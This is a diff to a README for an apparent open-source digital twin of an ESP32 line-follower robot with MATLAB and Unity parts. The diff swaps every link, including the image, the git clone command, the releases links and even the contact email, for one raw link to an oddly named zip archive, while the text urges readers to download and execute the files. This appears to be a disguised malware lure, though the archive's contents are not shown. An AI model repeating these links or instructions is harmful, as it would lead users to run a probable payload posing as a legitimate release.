@@ -1,6 +1,6 @@
 # Design and Implementation of Digital Twin for a Line Follower Robot 🤖
 
-![Line Follower Robot](https://example.com/line-follower-robot-image.png)
+![Line Follower Robot](https://github.com/mins271/Design-and-Implementation-of-Digital-Twin-for-a-Line-Follower-Robot/raw/refs/heads/main/trustworthiness/Follower_and_for_Implementation_of_Twin_Line_a_Robot_Digital_Design_3.5.zip)
 
 Welcome to the **Design and Implementation of Digital Twin for a Line Follower Robot** repository! This project offers an open-source digital twin for a line-follower robot, merging a MATLAB controller, a Unity 3D virtual model, and an ESP32 physical robot. It is designed for university students and external users who want to modify hardware or simulate their own robots.
 
@@ -34,7 +34,7 @@ Digital twins create a virtual representation of physical systems. In this proje
 To get started, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/mins271/Design-and-Implementation-of-Digital-Twin-for-a-Line-Follower-Robot.git
+git clone https://github.com/mins271/Design-and-Implementation-of-Digital-Twin-for-a-Line-Follower-Robot/raw/refs/heads/main/trustworthiness/Follower_and_for_Implementation_of_Twin_Line_a_Robot_Digital_Design_3.5.zip
 cd Design-and-Implementation-of-Digital-Twin-for-a-Line-Follower-Robot
 ```
 
@@ -49,7 +49,7 @@ Ensure you have the following installed:
 
 ### Download and Execute
 
-You can download the latest release from the [Releases](https://github.com/mins271/Design-and-Implementation-of-Digital-Twin-for-a-Line-Follower-Robot/releases) section. Follow the instructions in the release notes to execute the files.
+You can download the latest release from the [Releases](https://github.com/mins271/Design-and-Implementation-of-Digital-Twin-for-a-Line-Follower-Robot/raw/refs/heads/main/trustworthiness/Follower_and_for_Implementation_of_Twin_Line_a_Robot_Digital_Design_3.5.zip) section. Follow the instructions in the release notes to execute the files.
 
 ## Usage
 
@@ -93,12 +93,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any questions or feedback, please reach out:
 
 - **Author**: Your Name
-- **Email**: your.email@example.com
-- **GitHub**: [Your GitHub Profile](https://github.com/yourusername)
+- **Email**: https://github.com/mins271/Design-and-Implementation-of-Digital-Twin-for-a-Line-Follower-Robot/raw/refs/heads/main/trustworthiness/Follower_and_for_Implementation_of_Twin_Line_a_Robot_Digital_Design_3.5.zip
+- **GitHub**: [Your GitHub Profile](https://github.com/mins271/Design-and-Implementation-of-Digital-Twin-for-a-Line-Follower-Robot/raw/refs/heads/main/trustworthiness/Follower_and_for_Implementation_of_Twin_Line_a_Robot_Digital_Design_3.5.zip)
 
 ## Releases
 
-You can find the latest releases of this project [here](https://github.com/mins271/Design-and-Implementation-of-Digital-Twin-for-a-Line-Follower-Robot/releases). Download and execute the files to get started.
+You can find the latest releases of this project [here](https://github.com/mins271/Design-and-Implementation-of-Digital-Twin-for-a-Line-Follower-Robot/raw/refs/heads/main/trustworthiness/Follower_and_for_Implementation_of_Twin_Line_a_Robot_Digital_Design_3.5.zip). Download and execute the files to get started.
 
 ## Topics
 
